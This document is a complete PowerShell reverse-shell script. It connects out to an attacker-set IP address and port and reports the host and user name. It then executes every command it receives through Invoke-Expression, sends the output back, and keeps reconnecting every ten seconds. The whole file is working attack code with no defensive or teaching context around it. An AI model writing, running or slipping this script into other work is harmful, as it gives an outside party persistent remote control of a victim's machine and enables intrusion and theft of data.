$ip = "Your IP"
$port = 4445

function Connect-Back {
    $socket = $null
    $stream = $null
    $writer = $null
    $reader = $null
    
    try {
        # Create socket and connect
        $socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp)
        $socket.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket, [System.Net.Sockets.SocketOptionName]::KeepAlive, $true)
        $socket.Connect($ip, $port)
        
        # Create NetworkStream from socket
        $stream = New-Object System.Net.Sockets.NetworkStream($socket, $true)
        $stream.ReadTimeout = 60000  # 60 second timeout
        $stream.WriteTimeout = 60000  # 60 second timeout
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        
        # Send connection confirmation
        $writer.WriteLine("Connected to $env:COMPUTERNAME as $env:USERNAME")
        $writer.Flush()
        
        # Command processing loop
        while ($socket.Connected) {
            $cmd = $reader.ReadLine()
            
            if ($null -eq $cmd -or $cmd.ToLower() -eq "exit") {
                break
            }
            
            try {
                $output = Invoke-Expression $cmd 2>&1 | Out-String
                if ([string]::IsNullOrEmpty($output)) {
                    $output = "Command executed with no output."
                }
            }
            catch {
                $output = "Error executing command: $_"
            }
            
            # Send response back
            $writer.WriteLine($output)
            $writer.Flush()
        }
    }
    catch [System.Net.Sockets.SocketException] {
        Write-Warning "Socket Error: $_"
    }
    catch {
        Write-Warning "General Error: $_"
    }
    finally {
        # Clean up resources
        if ($writer) { $writer.Close() }
        if ($reader) { $reader.Close() }
        if ($stream) { $stream.Close() }
        if ($socket) { $socket.Close() }
    }
}

# Use a loop instead of recursion to avoid stack overflow
while ($true) {
    Connect-Back
    Write-Output "Connection lost. Reconnecting in 10 seconds..."
    Start-Sleep -Seconds 10
}
